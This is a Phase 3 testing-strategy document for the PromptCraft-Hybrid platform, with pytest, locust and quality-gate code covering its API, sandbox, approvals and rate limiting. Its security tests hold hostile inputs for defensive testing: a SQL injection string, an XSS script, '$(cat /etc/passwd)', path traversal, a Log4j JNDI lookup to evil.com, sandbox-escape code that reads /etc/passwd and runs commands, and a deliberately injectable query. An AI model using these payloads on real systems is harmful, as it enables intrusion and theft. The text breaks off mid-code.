---
title: "PromptCraft-Hybrid: Phase 3 Testing Strategy"
version: "2.0"
status: published
component: Architecture
tags: ['phase-3', 'testing', 'quality-assurance', 'security', 'performance']
source: PromptCraft-Hybrid Project
purpose: Comprehensive testing strategy and quality assurance framework for Phase 3 end-to-end execution capabilities and production readiness validation.
---

# PromptCraft-Hybrid: Phase 3 Testing Strategy

## 1. Testing Philosophy & Quality Framework

### 1.1. Phase 3 Quality Assurance Approach

Phase 3 testing focuses on validating end-to-end execution capabilities, security isolation, and production readiness. The testing strategy emphasizes:

**Multi-Layer Testing Pyramid:**
- **Unit Tests (40%)**: Component isolation with 85% coverage minimum
- **Integration Tests (35%)**: Multi-service workflows and API contracts
- **End-to-End Tests (20%)**: Complete user journey validation
- **Security Tests (5%)**: Specialized security and isolation validation

**Critical Quality Gates:**
- End-to-end execution success rate >80%
- Human-in-loop efficiency <5 minutes
- API security with zero incidents
- 100% sandbox isolation validation
- State management reliability >99.5%

### 1.2. Test Automation Framework

```yaml
testing_framework:
  unit_testing:
    framework: "pytest + asyncio"
    target_coverage: "85% minimum (increased from Phase 2)"
    focus_areas: ["execution_engine", "api_gateway", "state_management"]

  integration_testing:
    framework: "pytest + docker-compose"
    environment: "full containerized stack"
    focus_areas: ["workflow_orchestration", "approval_workflows", "security_validation"]

  security_testing:
    framework: "custom + bandit + safety"
    focus_areas: ["sandbox_isolation", "api_authentication", "approval_bypass"]

  performance_testing:
    framework: "locust + k6"
    target_metrics: "p95 < 5s execution start, p99 < 30s completion"
    load_patterns: "concurrent executions + approval workflows"
```

## 2. Success Criteria & Metrics

### 2.1. Phase 3 Success Metrics

| Metric | Target | Measurement Method | Acceptance Criteria |
|:-------|:-------|:------------------|:-------------------|
| **End-to-End Execution Success** | >80% | Automated test suite with 50 scenarios | 80% of executions complete successfully |
| **Human-in-Loop Efficiency** | <5 min approval time | HITL MCP metrics | Average approval response under 5 minutes |
| **API Security** | 0 security incidents | Security testing + monitoring | No unauthorized access or data breaches |
| **Execution Safety** | 100% sandbox isolation | Security validation | No code execution escapes sandbox |
| **State Management Reliability** | >99.5% uptime | Redis monitoring | Workflow state never lost |
| **IDE Integration Quality** | >4.0/5 rating | Developer feedback | IDE integration rated above 4.0/5 |

### 2.2. Additional Quality Metrics

| Category | Metric | Target | Critical Path |
|:---------|:-------|:-------|:-------------|
| **Performance** | Execution Start Latency | <5s p95 | Journey 4 responsiveness |
| **Performance** | Analysis Response Time | <3s p95 | Journey 3 IDE integration |
| **Reliability** | Workflow Recovery Rate | >95% | State management resilience |
| **Security** | Sandbox Escape Attempts | 0 successful | Code execution safety |
| **Usability** | Approval Workflow UX | <3 clicks | Human-in-loop efficiency |
| **Scalability** | Concurrent Executions | 5+ simultaneous | Multi-user support |

## 3. Comprehensive Test Suite

### 3.1. Phase 3 Integration Tests

```python
# tests/test_phase3_complete.py
import pytest
import asyncio
import time
import requests
from unittest.mock import patch, MagicMock
import json
import uuid

class TestPhase3Integration:
    """Complete Phase 3 integration testing"""

    @pytest.fixture
    async def authenticated_client(self):
        """Setup authenticated API client"""
        auth_response = requests.post(
            "http://localhost:8000/auth/token",
            json={"username": "test_user", "password": "test_pass"}
        )
        token = auth_response.json()["access_token"]

        return {
            "headers": {"Authorization": f"Bearer {token}"},
            "base_url": "http://localhost:8000"
        }

    async def test_complete_execution_workflow(self, authenticated_client):
        """Test complete Journey 4 execution workflow"""

        # Step 1: Start execution
        execution_request = {
            "goal": "Create a secure JWT authentication function with tests",
            "context": {
                "execution_preferences": {
                    "require_approval": False,  # Auto-approve for testing
                    "max_iterations": 2,
                    "timeout_minutes": 10
                }
            },
            "options": {
                "include_artifacts": True,
                "enable_human_loop": False
            }
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json=execution_request,
            headers=authenticated_client["headers"]
        )

        assert response.status_code == 202
        workflow_id = response.json()["data"]["workflow_id"]

        # Step 2: Monitor execution progress
        max_wait_time = 300  # 5 minutes
        start_time = time.time()

        while time.time() - start_time < max_wait_time:
            status_response = requests.get(
                f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
                headers=authenticated_client["headers"]
            )

            assert status_response.status_code == 200
            status_data = status_response.json()["data"]

            if status_data["status"] == "completed":
                # Verify artifacts were generated
                artifacts = status_data.get("artifacts", {})
                assert "generated_code" in artifacts
                assert "test_results" in artifacts
                assert len(artifacts["generated_code"]) > 100  # Non-trivial code

                # Verify security analysis was performed
                if "security_report" in artifacts:
                    security_report = artifacts["security_report"]
                    assert "overall_score" in security_report

                # Verify test execution
                test_results = artifacts["test_results"]
                assert test_results.get("success_rate", 0) > 0.7  # 70% tests pass

                break
            elif status_data["status"] == "failed":
                pytest.fail(f"Execution failed: {status_data.get('error', 'Unknown error')}")

            time.sleep(5)
        else:
            pytest.fail("Execution timed out")

    async def test_ide_integration_api(self, authenticated_client):
        """Test Journey 3 IDE integration API"""

        test_code = """
        def authenticate_user(username, password):
            # This function has security issues for testing
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
            return database.execute(query)
        """

        analysis_request = {
            "analysis_type": "security",
            "context": {
                "file_content": test_code,
                "file_path": "auth.py",
                "language": "python"
            },
            "options": {
                "include_suggestions": True,
                "severity_threshold": "medium"
            }
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/analyze",
            json=analysis_request,
            headers=authenticated_client["headers"]
        )

        assert response.status_code == 200
        data = response.json()["data"]

        # Verify security analysis detected SQL injection
        suggestions = data.get("suggestions", [])
        security_suggestions = [s for s in suggestions if s["type"] == "security"]
        assert len(security_suggestions) > 0

        # Verify SQL injection was detected
        sql_injection_found = any(
            "sql injection" in suggestion["description"].lower()
            for suggestion in security_suggestions
        )
        assert sql_injection_found

        # Verify executable actions are provided
        executable_actions = data.get("executable_actions", [])
        assert len(executable_actions) > 0

        # Verify metadata
        metadata = response.json()["metadata"]
        assert metadata["processing_time_ms"] < 10000  # Under 10 seconds
        assert "heimdall" in metadata["tools_used"]

    async def test_human_in_loop_workflow(self, authenticated_client):
        """Test human-in-loop approval workflow"""

        # Start execution that requires approval
        execution_request = {
            "goal": "Deploy authentication function to production",
            "context": {
                "execution_preferences": {
                    "require_approval": True,
                    "security_level": "strict"
                }
            }
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json=execution_request,
            headers=authenticated_client["headers"]
        )
        assert response.status_code == 202
        workflow_id = response.json()["data"]["workflow_id"]

        # Wait for approval to be requested
        approval_found = False
        for _ in range(30):  # Wait up to 30 seconds
            status_response = requests.get(
                f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
                headers=authenticated_client["headers"]
            )

            status_data = status_response.json()["data"]

            if status_data["status"] == "waiting_approval":
                pending_approvals = status_data.get("pending_approvals", [])
                if pending_approvals:
                    approval_id = pending_approvals[0]["approval_id"]
                    approval_found = True
                    break

            time.sleep(1)

        assert approval_found, "No approval request found"

        # Approve the execution
        approval_request = {
            "workflow_id": workflow_id,
            "approval_id": approval_id,
            "decision": "approved",
            "comment": "Automated test approval"
        }

        approval_response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute/approve/{workflow_id}",
            json=approval_request,
            headers=authenticated_client["headers"]
        )

        assert approval_response.status_code == 200
        assert approval_response.json()["status"] == "success"

    async def test_sandbox_isolation(self, authenticated_client):
        """Test code execution sandbox isolation"""

        # Attempt to execute code that tries to break out of sandbox
        malicious_code = """
        import os
        import subprocess
        import socket

        # Attempt various escape techniques
        try:
            # Try to read sensitive files
            with open('/etc/passwd', 'r') as f:
                sensitive_data = f.read()
            print("SECURITY BREACH: Accessed /etc/passwd")
        except:
            print("File access blocked (good)")

        try:
            # Try to make network connections
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('google.com', 80))
            print("SECURITY BREACH: Network access allowed")
        except:
            print("Network access blocked (good)")

        try:
            # Try to execute system commands
            result = subprocess.run(['whoami'], capture_output=True, text=True)
            print(f"SECURITY BREACH: Command execution: {result.stdout}")
        except:
            print("Command execution blocked (good)")
        """

        execution_request = {
            "goal": "Test sandbox security",
            "context": {
                "project_context": {
                    "file_content": malicious_code
                },
                "execution_preferences": {
                    "require_approval": False,
                    "security_level": "strict"
                }
            }
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json=execution_request,
            headers=authenticated_client["headers"]
        )

        assert response.status_code == 202
        workflow_id = response.json()["data"]["workflow_id"]

        # Monitor execution and verify no security breaches
        max_wait_time = 120  # 2 minutes
        start_time = time.time()

        while time.time() - start_time < max_wait_time:
            status_response = requests.get(
                f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
                headers=authenticated_client["headers"]
            )

            status_data = status_response.json()["data"]

            if status_data["status"] in ["completed", "failed"]:
                # Check execution output for security breaches
                artifacts = status_data.get("artifacts", {})
                if "test_results" in artifacts:
                    output = str(artifacts["test_results"])

                    # Verify no security breaches occurred
                    assert "SECURITY BREACH" not in output
                    assert "File access blocked" in output or "Network access blocked" in output

                break

            time.sleep(2)
        else:
            pytest.fail("Sandbox test timed out")

    async def test_state_persistence_and_recovery(self, authenticated_client):
        """Test workflow state persistence and recovery"""

        # Start a long-running execution
        execution_request = {
            "goal": "Complex multi-step task for state testing",
            "context": {
                "execution_preferences": {
                    "max_iterations": 5,
                    "timeout_minutes": 15
                }
            }
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json=execution_request,
            headers=authenticated_client["headers"]
        )

        workflow_id = response.json()["data"]["workflow_id"]

        # Get initial state
        initial_status = requests.get(
            f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
            headers=authenticated_client["headers"]
        )
        initial_data = initial_status.json()["data"]

        # Simulate brief interruption (in real test, would restart services)
        time.sleep(5)

        # Verify state is still accessible
        recovered_status = requests.get(
            f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
            headers=authenticated_client["headers"]
        )

        assert recovered_status.status_code == 200
        recovered_data = recovered_status.json()["data"]

        # Verify state consistency
        assert recovered_data["workflow_id"] == initial_data["workflow_id"]
        assert recovered_data["status"] in ["running", "waiting_approval", "completed"]

        # Verify progress was maintained or advanced
        assert recovered_data["current_step"] >= initial_data["current_step"]

    async def test_rate_limiting(self, authenticated_client):
        """Test API rate limiting functionality"""

        # Make requests up to the limit
        successful_requests = 0
        rate_limited_requests = 0

        for i in range(10):  # Try 10 requests rapidly
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json={
                    "analysis_type": "general",
                    "context": {"file_content": f"# Test code {i}"}
                },
                headers=authenticated_client["headers"]
            )

            if response.status_code == 200:
                successful_requests += 1
            elif response.status_code == 429:  # Too Many Requests
                rate_limited_requests += 1

            time.sleep(0.1)  # Brief pause between requests

        # Should have some successful requests and some rate limited
        assert successful_requests > 0

        # If we hit rate limits, verify proper error message
        if rate_limited_requests > 0:
            rate_limit_response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json={
                    "analysis_type": "general",
                    "context": {"file_content": "# Rate limit test"}
                },
                headers=authenticated_client["headers"]
            )

            if rate_limit_response.status_code == 429:
                error_detail = rate_limit_response.json().get("detail", "")
                assert "rate limit" in error_detail.lower()

    async def test_error_handling_and_recovery(self, authenticated_client):
        """Test error handling and recovery mechanisms"""

        # Test with invalid execution goal
        invalid_request = {
            "goal": "",  # Empty goal should be rejected
            "context": {}
        }

        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json=invalid_request,
            headers=authenticated_client["headers"]
        )

        assert response.status_code == 422  # Validation error

        # Test with malformed request
        malformed_response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json={"invalid": "structure"},
            headers=authenticated_client["headers"]
        )

        assert malformed_response.status_code in [400, 422]

        # Test accessing non-existent workflow
        nonexistent_response = requests.get(
            f"{authenticated_client['base_url']}/api/v3/execute/status/nonexistent-workflow-id",
            headers=authenticated_client["headers"]
        )

        assert nonexistent_response.status_code == 404

    async def test_cost_tracking_and_limits(self, authenticated_client):
        """Test cost tracking and budget enforcement"""

        # Make multiple expensive operations
        expensive_requests = []

        for i in range(3):
            request = {
                "goal": f"Complex analysis task {i} requiring premium search and multiple agents",
                "context": {
                    "execution_preferences": {
                        "enable_premium_search": True,
                        "max_agents": 3
                    }
                }
            }

            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json=request,
                headers=authenticated_client["headers"]
            )

            expensive_requests.append(response)

        # At least some should succeed
        successful_expensive = [r for r in expensive_requests if r.status_code == 202]
        assert len(successful_expensive) > 0

        # If cost limits are enforced, later requests might be rejected
        # This depends on the configured cost limits

        # Verify cost tracking is working by checking a completed workflow
        if successful_expensive:
            workflow_id = successful_expensive[0].json()["data"]["workflow_id"]

            # Wait for completion or significant progress
            time.sleep(10)

            status_response = requests.get(
                f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
                headers=authenticated_client["headers"]
            )

            if status_response.status_code == 200:
                status_data = status_response.json()["data"]
                metrics = status_data.get("metrics", {})

                # Verify cost tracking is present
                assert "total_cost" in metrics
                assert isinstance(metrics["total_cost"], (int, float))
                assert metrics["total_cost"] >= 0
```

### 3.2. Performance Testing Suite

```python
# tests/performance/test_phase3_performance.py
import pytest
import asyncio
import time
import requests
import concurrent.futures
import statistics

class TestPhase3Performance:
    """Performance testing for Phase 3"""

    async def test_concurrent_executions(self, authenticated_client):
        """Test handling of concurrent execution workflows"""

        # Start multiple executions concurrently
        concurrent_requests = []

        for i in range(5):
            request = {
                "goal": f"Concurrent test task {i}",
                "context": {
                    "execution_preferences": {
                        "timeout_minutes": 5,
                        "require_approval": False
                    }
                }
            }

            # Start requests without waiting
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json=request,
                headers=authenticated_client["headers"]
            )

            concurrent_requests.append({
                "response": response,
                "workflow_id": response.json().get("data", {}).get("workflow_id") if response.status_code == 202 else None
            })

        # Verify all requests were accepted
        successful_starts = [r for r in concurrent_requests if r["response"].status_code == 202]
        assert len(successful_starts) >= 3  # At least 3 should start successfully

        # Monitor progress of concurrent executions
        start_time = time.time()
        max_wait = 180  # 3 minutes

        completed_workflows = 0

        while time.time() - start_time < max_wait and completed_workflows < len(successful_starts):
            for workflow_info in successful_starts:
                if not workflow_info["workflow_id"]:
                    continue

                status_response = requests.get(
                    f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_info['workflow_id']}",
                    headers=authenticated_client["headers"]
                )

                if status_response.status_code == 200:
                    status_data = status_response.json()["data"]
                    if status_data["status"] in ["completed", "failed"]:
                        if not workflow_info.get("completed"):
                            workflow_info["completed"] = True
                            completed_workflows += 1

            time.sleep(5)

        # Verify reasonable completion rate
        assert completed_workflows >= len(successful_starts) * 0.6  # At least 60% complete

    async def test_api_response_times(self, authenticated_client):
        """Test API response time performance"""

        # Test analysis endpoint performance
        analysis_times = []

        for _ in range(10):
            start_time = time.time()

            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json={
                    "analysis_type": "security",
                    "context": {
                        "file_content": "def test_function(): return 'hello world'",
                        "language": "python"
                    }
                },
                headers=authenticated_client["headers"]
            )

            end_time = time.time()

            if response.status_code == 200:
                analysis_times.append(end_time - start_time)

        # Verify performance targets
        if analysis_times:
            avg_time = sum(analysis_times) / len(analysis_times)
            p95_time = sorted(analysis_times)[int(0.95 * len(analysis_times))]

            assert avg_time < 5.0  # Average under 5 seconds
            assert p95_time < 10.0  # P95 under 10 seconds

            print(f"Analysis API Performance:")
            print(f"  Average: {avg_time:.2f}s")
            print(f"  P95: {p95_time:.2f}s")

        # Test execution start performance
        execution_start_times = []

        for _ in range(5):
            start_time = time.time()

            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json={
                    "goal": "Simple performance test task",
                    "context": {"execution_preferences": {"timeout_minutes": 1}}
                },
                headers=authenticated_client["headers"]
            )

            end_time = time.time()

            if response.status_code == 202:
                execution_start_times.append(end_time - start_time)

                # Cancel the execution to avoid resource usage
                workflow_id = response.json()["data"]["workflow_id"]
                requests.post(
                    f"{authenticated_client['base_url']}/api/v3/execute/cancel/{workflow_id}",
                    headers=authenticated_client["headers"]
                )

        # Verify execution start performance
        if execution_start_times:
            avg_start_time = sum(execution_start_times) / len(execution_start_times)
            assert avg_start_time < 3.0  # Execution should start within 3 seconds

            print(f"Execution Start Performance:")
            print(f"  Average: {avg_start_time:.2f}s")

    async def test_memory_usage_monitoring(self, authenticated_client):
        """Test memory usage during concurrent operations"""

        # Start multiple memory-intensive operations
        memory_test_requests = []

        for i in range(3):
            request = {
                "goal": f"Memory-intensive analysis task {i}",
                "context": {
                    "project_context": {
                        "file_content": "# Large code analysis task\n" + "# Comment line\n" * 1000
                    }
                }
            }

            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json=request,
                headers=authenticated_client["headers"]
            )

            memory_test_requests.append(response)

        # Verify all requests completed successfully
        successful_responses = [r for r in memory_test_requests if r.status_code == 200]
        assert len(successful_responses) >= 2  # At least 2 should succeed

        # In a real implementation, this would check actual memory usage
        # For now, we verify the system remained responsive

        # Quick health check to ensure system is still responsive
        health_response = requests.get(f"{authenticated_client['base_url']}/health")
        assert health_response.status_code == 200
```

### 3.3. Security Testing Framework

```python
# tests/security/test_phase3_security.py
import pytest
import requests
import json
import time
from unittest.mock import patch

class TestPhase3Security:
    """Comprehensive security testing for Phase 3"""

    def test_authentication_enforcement(self):
        """Test API authentication is properly enforced"""

        # Test endpoints without authentication
        protected_endpoints = [
            ("POST", "/api/v3/execute", {"goal": "test"}),
            ("POST", "/api/v3/analyze", {"analysis_type": "general", "context": {}}),
            ("GET", "/api/v3/execute/status/test-id", None)
        ]

        for method, endpoint, payload in protected_endpoints:
            if method == "POST":
                response = requests.post(f"http://localhost:8000{endpoint}", json=payload)
            else:
                response = requests.get(f"http://localhost:8000{endpoint}")

            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"

    def test_jwt_token_validation(self):
        """Test JWT token validation and expiration"""

        # Test with invalid token
        invalid_headers = {"Authorization": "Bearer invalid-token"}

        response = requests.post(
            "http://localhost:8000/api/v3/analyze",
            json={"analysis_type": "general", "context": {}},
            headers=invalid_headers
        )

        assert response.status_code == 401
        assert "Invalid token" in response.json().get("detail", "")

        # Test with expired token (would need to create expired token)
        # This is a placeholder for comprehensive token testing

    def test_input_validation_and_sanitization(self, authenticated_client):
        """Test input validation prevents injection attacks"""

        # Test SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(cat /etc/passwd)",
            "{{7*7}}",  # Template injection
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}"  # Log4j style
        ]

        for malicious_input in malicious_inputs:
            # Test in analysis request
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json={
                    "analysis_type": "general",
                    "context": {"file_content": malicious_input}
                },
                headers=authenticated_client["headers"]
            )

            # Should not cause errors or return malicious content
            if response.status_code == 200:
                response_text = str(response.json())
                assert "DROP TABLE" not in response_text
                assert "<script>" not in response_text

            # Test in execution request
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json={
                    "goal": malicious_input,
                    "context": {}
                },
                headers=authenticated_client["headers"]
            )

            # Should either reject malicious input or sanitize it
            if response.status_code not in [400, 422]:  # Validation errors are acceptable
                response_text = str(response.json())
                assert "DROP TABLE" not in response_text
                assert "<script>" not in response_text

    def test_sandbox_security_isolation(self, authenticated_client):
        """Test sandbox prevents code execution escapes"""

        # Test various escape techniques
        escape_attempts = [
            # File system access attempts
            """
            import os
            try:
                with open('/etc/passwd', 'r') as f:
                    print(f.read())
            except Exception as e:
                print(f"File access blocked: {e}")
            """,

            # Network access attempts
            """
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(('8.8.8.8', 53))
                print("Network access successful")
            except Exception as e:
                print(f"Network access blocked: {e}")
            """,

            # Process execution attempts
            """
            import subprocess
            try:
                result = subprocess.run(['whoami'], capture_output=True, text=True)
                print(f"Command executed: {result.stdout}")
            except Exception as e:
                print(f"Command execution blocked: {e}")
            """,

            # Module import restrictions
            """
            try:
                import requests
                print("requests module imported")
            except ImportError as e:
                print(f"Module import restricted: {e}")
            """
        ]

        for code in escape_attempts:
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json={
                    "goal": "Test sandbox security",
                    "context": {
                        "project_context": {"file_content": code},
                        "execution_preferences": {"require_approval": False}
                    }
                },
                headers=authenticated_client["headers"]
            )

            assert response.status_code == 202  # Should accept request

            workflow_id = response.json()["data"]["workflow_id"]

            # Monitor execution
            max_wait = 60
            start_time = time.time()

            while time.time() - start_time < max_wait:
                status_response = requests.get(
                    f"{authenticated_client['base_url']}/api/v3/execute/status/{workflow_id}",
                    headers=authenticated_client["headers"]
                )

                if status_response.status_code == 200:
                    status_data = status_response.json()["data"]

                    if status_data["status"] in ["completed", "failed"]:
                        # Verify no successful escapes in output
                        artifacts = status_data.get("artifacts", {})
                        output = str(artifacts)

                        # Check for signs of successful escapes
                        assert "root:" not in output  # /etc/passwd content
                        assert "Network access successful" not in output
                        assert "Command executed:" not in output

                        break

                time.sleep(2)

    def test_approval_workflow_security(self, authenticated_client):
        """Test approval workflow cannot be bypassed"""

        # Start execution requiring approval
        response = requests.post(
            f"{authenticated_client['base_url']}/api/v3/execute",
            json={
                "goal": "Deploy critical security function",
                "context": {
                    "execution_preferences": {
                        "require_approval": True,
                        "security_level": "strict"
                    }
                }
            },
            headers=authenticated_client["headers"]
        )

        workflow_id = response.json()["data"]["workflow_id"]

        # Attempt to bypass approval by calling status/continue endpoints
        bypass_attempts = [
            f"/api/v3/execute/status/{workflow_id}",  # Should work
            f"/api/v3/execute/continue/{workflow_id}",  # Should not exist
            f"/api/v3/execute/force/{workflow_id}",  # Should not exist
        ]

        for endpoint in bypass_attempts:
            bypass_response = requests.post(
                f"{authenticated_client['base_url']}{endpoint}",
                headers=authenticated_client["headers"]
            )

            # Only status endpoint should work
            if "status" in endpoint:
                assert bypass_response.status_code in [200, 404]
            else:
                assert bypass_response.status_code in [404, 405]  # Not found or method not allowed

    def test_rate_limiting_security(self, authenticated_client):
        """Test rate limiting prevents abuse"""

        # Test rapid execution requests (should be limited)
        execution_requests = []

        for i in range(10):  # Try to exceed limit
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/execute",
                json={"goal": f"Rate limit test {i}", "context": {}},
                headers=authenticated_client["headers"]
            )
            execution_requests.append(response.status_code)
            time.sleep(0.1)

        # Should have some rate limited requests
        rate_limited = sum(1 for status in execution_requests if status == 429)
        assert rate_limited > 0, "Rate limiting should prevent excessive execution requests"

        # Test rapid analysis requests
        analysis_requests = []

        for i in range(100):  # Try to exceed hourly limit
            response = requests.post(
                f"{authenticated_client['base_url']}/api/v3/analyze",
                json={
                    "analysis_type": "general",
                    "context": {"file_content": f"# Test {i}"}
                },
                headers=authenticated_client["headers"]
            )
            analysis_requests.append(response.status_code)

            if response.status_code == 429:
                break  # Stop when rate limited

        # Should eventually hit rate limit
        rate_limited_analysis = sum(1 for status in analysis_requests if status == 429)
        assert rate_limited_analysis > 0, "Rate limiting should prevent excessive analysis requests"
```

### 3.4. Load Testing Framework

```python
# tests/performance/locustfile_phase3.py
from locust import HttpUser, task, between
import random
import json
import time

class Phase3LoadTestUser(HttpUser):
    """Load testing for Phase 3 capabilities"""

    wait_time = between(2, 8)  # Wait 2-8 seconds between requests
    host = "http://localhost:8000"

    def on_start(self):
        """Setup user session"""
        # Authenticate user
        auth_response = self.client.post("/auth/token", json={
            "username": "test_user",
            "password": "test_pass"
        })

        if auth_response.status_code == 200:
            token = auth_response.json()["access_token"]
            self.headers = {"Authorization": f"Bearer {token}"}
        else:
            self.headers = {}

    @task(3)
    def analyze_code(self):
        """Journey 3: Code analysis requests (60% of traffic)"""
        code_samples = [
            "def login(user, pass): return auth(user, pass)",
            "class UserManager:\n    def __init__(self):\n        self.users = []",
            "import os\nconfig = os.environ.get('SECRET_KEY')",
            "async def process_data(data):\n    return await transform(data)"
        ]

        analysis_types = ["security", "performance", "general", "architecture"]

        payload = {
            "analysis_type": random.choice(analysis_types),
            "context": {
                "file_content": random.choice(code_samples),
                "language": "python"
            },
            "options": {
                "include_suggestions": True,
                "severity_threshold": random.choice(["low", "medium", "high"])
            }
        }

        with self.client.post("/api/v3/analyze", json=payload, headers=self.headers, catch_response=True) as response:
            if response.status_code == 200:
                data = response.json()
                if "suggestions" in data.get("data", {}):
                    response.success()
                else:
                    response.failure("No suggestions in response")
            elif response.status_code == 429:
                response.failure("Rate limited")
            else:
                response.failure(f"Request failed with status {response.status_code}")

    @task(1)
    def execute_task(self):
        """Journey 4: Task execution requests (20% of traffic)"""
        goals = [
            "Create a simple utility function",
            "Generate unit tests for existing code",
            "Optimize performance of data processing",
            "Add error handling to API endpoints",
            "Create documentation for module"
        ]

        payload = {
            "goal": random.choice(goals),
            "context": {
                "execution_preferences": {
                    "require_approval": False,  # Skip approval for load testing
                    "timeout_minutes": 5,
                    "max_iterations": 2
                }
            },
            "options": {
                "include_artifacts": True
            }
        }

        with self.client.post("/api/v3/execute", json=payload, headers=self.headers, catch_response=True) as response:
            if response.status_code == 202:
                workflow_id = response.json()["data"]["workflow_id"]

                # Monitor execution for a short time
                for _ in range(5):  # Check 5 times
                    time.sleep(2)
                    status_response = self.client.get(
                        f"/api/v3/execute/status/{workflow_id}",
                        headers=self.headers
                    )

                    if status_response.status_code == 200:
                        status_data = status_response.json()["data"]
                        if status_data["status"] in ["completed", "failed"]:
                            if status_data["status"] == "completed":
                                response.success()
                            else:
                                response.failure("Execution failed")
                            break
                else:
                    # Cancel execution if still running
                    self.client.post(
                        f"/api/v3/execute/cancel/{workflow_id}",
                        headers=self.headers
                    )
                    response.success()  # Don't fail due to timeout in load test
            elif response.status_code == 429:
                response.failure("Rate limited")
            else:
                response.failure(f"Request failed with status {response.status_code}")

    @task(1)
    def check_system_health(self):
        """Health checks (20% of traffic)"""
        with self.client.get("/health", catch_response=True) as response:
            if response.status_code == 200:
                health_data = response.json()
                if health_data.get("status") == "healthy":
                    response.success()
                else:
                    response.failure("System not healthy")
            else:
                response.failure(f"Health check failed: {response.status_code}")

class StressTestUser(HttpUser):
    """High-intensity stress testing"""

    wait_time = between(0.1, 1.0)  # Aggressive timing
    host = "http://localhost:8000"

    def on_start(self):
        # Quick authentication
        auth_response = self.client.post("/auth/token", json={
            "username": "stress_user",
            "password": "stress_pass"
        })

        if auth_response.status_code == 200:
            token = auth_response.json()["access_token"]
            self.headers = {"Authorization": f"Bearer {token}"}
        else:
            self.headers = {}

    @task
    def rapid_analysis_requests(self):
        """Rapid-fire analysis requests for stress testing"""
        payload = {
            "analysis_type": "general",
            "context": {"file_content": f"# Stress test code {random.randint(1, 1000)}"},
            "options": {"include_suggestions": False}  # Minimal processing
        }

        self.client.post("/api/v3/analyze", json=payload, headers=self.headers)
```

## 4. Quality Gates & Automated Validation

### 4.1. Continuous Quality Monitoring

```python
# tests/quality_gates/phase3_quality_runner.py
import subprocess
import json
import sys
import time
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Any

@dataclass
class QualityMetric:
    name: str
    target: float
    current: float
    status: str
    critical: bool = False

class Phase3QualityGates:
    """Automated quality gate enforcement for Phase 3"""

    def __init__(self):
        self.results = []
        self.reports_dir = Path("reports/phase3")
        self.reports_dir.mkdir(parents=True, exist_ok=True)

    def run_all_quality_gates(self) -> bool:
        """Execute all Phase 3 quality gates"""
        gates = [
            self.execution_success_rate_gate,
            self.security_isolation_gate,
            self.performance_benchmarks_gate,
            self.api_security_gate,
            self.state_reliability_gate,
            self.human_loop_efficiency_gate
        ]

        all_passed = True
        gate_results = []

        for gate in gates:
            try:
                result = gate()
                gate_results.append(result)
                if not result["passed"]:
                    all_passed = False
                    if result.get("critical", False):
                        print(f"CRITICAL FAILURE: {result['name']}")
                        break
            except Exception as e:
                gate_results.append({
                    "name": gate.__name__,
                    "passed": False,
                    "error": str(e),
                    "critical": True
                })
                all_passed = False
                break

        self.generate_quality_report(gate_results, all_passed)
        return all_passed

    def execution_success_rate_gate(self) -> Dict:
        """Validate end-to-end execution success rate >80%"""

        # Run execution success tests
        result = subprocess.run([
            'pytest', 'tests/integration/test_execution_success.py',
            '--json-report', '--json-report-file=reports/phase3/execution_success.json'
        ], capture_output=True, text=True)

        # Parse results
        if Path("reports/phase3/execution_success.json").exists():
            with open("reports/phase3/execution_success.json", 'r') as f:
                test_data = json.load(f)

            total_tests = test_data['summary']['total']
            passed_tests = test_data['summary']['passed']
            success_rate = (passed_tests / total_tests) * 100 if total_tests > 0 else 0

            return {
                "name": "Execution Success Rate",
                "target": 80.0,
                "current": success_rate,
                "passed": success_rate >= 80.0,
                "critical": True,
                "details": {
                    "total_tests": total_tests,
                    "passed_tests": passed_tests,
                    "failed_tests": total_tests - passed_tests
                }
            }

        return {
            "name": "Execution Success Rate",
            "passed": False,
            "error": "Could not generate execution success report",
            "critical": True
        }

    def security_isolation_gate(self) -> Dict:
        """Validate 100% sandbox isolation"""

        # Run security isolation tests
        result = subprocess.run([
            'pytest', 'tests/security/test_sandbox_isolation.py', '-v',
            '--json-report', '--json-report-file=reports/phase3/security_isolation.json'
        ], capture_output=True, text=True)

        if Path("reports/phase3/security_isolation.json").exists():
            with open("reports/phase3/security_isolation.json", 'r') as f:
                test_data = json.load(f)

            total_tests = test_data['summary']['total']
            passed_tests = test_data['summary']['passed']
            isolation_success = (passed_tests / total_tests) * 100 if total_tests > 0 else 0

            return {
